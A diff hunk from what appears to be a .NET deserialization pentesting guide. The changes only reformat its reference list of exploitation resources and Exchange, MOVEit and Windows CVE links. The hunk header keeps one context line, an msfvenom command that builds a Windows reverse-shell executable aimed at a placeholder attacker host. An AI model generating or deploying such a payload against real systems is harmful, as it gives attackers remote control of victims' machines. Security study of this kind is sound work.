@@ -285,17 +285,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o 
 
 ## 8. References
 
-- ASP.NET official docs: https://learn.microsoft.com/en-us/aspnet/
-- HackTricks - .NET: https://book.hacktricks.xyz/pentesting-web/deserialization
-- ysoserial.net: https://github.com/pwntester/ysoserial.net
-- PayloadsAllTheThings - .NET: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/.Net%20Deserialization
-- CVE-2020-0688: https://nvd.nist.gov/vuln/detail/CVE-2020-0688
-- CVE-2021-34473: https://nvd.nist.gov/vuln/detail/CVE-2021-34473
-- CVE-2021-34523: https://nvd.nist.gov/vuln/detail/CVE-2021-34523
-- CVE-2021-31207: https://nvd.nist.gov/vuln/detail/CVE-2021-31207
-- CVE-2022-41040: https://nvd.nist.gov/vuln/detail/CVE-2022-41040
-- CVE-2022-41082: https://nvd.nist.gov/vuln/detail/CVE-2022-41082
-- CVE-2023-34362: https://nvd.nist.gov/vuln/detail/CVE-2023-34362
-- CVE-2024-38063: https://nvd.nist.gov/vuln/detail/CVE-2024-38063
+- ASP.NET official docs - https://learn.microsoft.com/en-us/aspnet/
+- HackTricks - .NET - https://book.hacktricks.xyz/pentesting-web/deserialization
+- ysoserial.net - https://github.com/pwntester/ysoserial.net
+- PayloadsAllTheThings - .NET - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/.Net%20Deserialization
+- CVE-2020-0688 - https://nvd.nist.gov/vuln/detail/CVE-2020-0688
+- CVE-2021-34473 - https://nvd.nist.gov/vuln/detail/CVE-2021-34473
+- CVE-2021-34523 - https://nvd.nist.gov/vuln/detail/CVE-2021-34523
+- CVE-2021-31207 - https://nvd.nist.gov/vuln/detail/CVE-2021-31207
+- CVE-2022-41040 - https://nvd.nist.gov/vuln/detail/CVE-2022-41040
+- CVE-2022-41082 - https://nvd.nist.gov/vuln/detail/CVE-2022-41082
+- CVE-2023-34362 - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
+- CVE-2024-38063 - https://nvd.nist.gov/vuln/detail/CVE-2024-38063
 
 ---
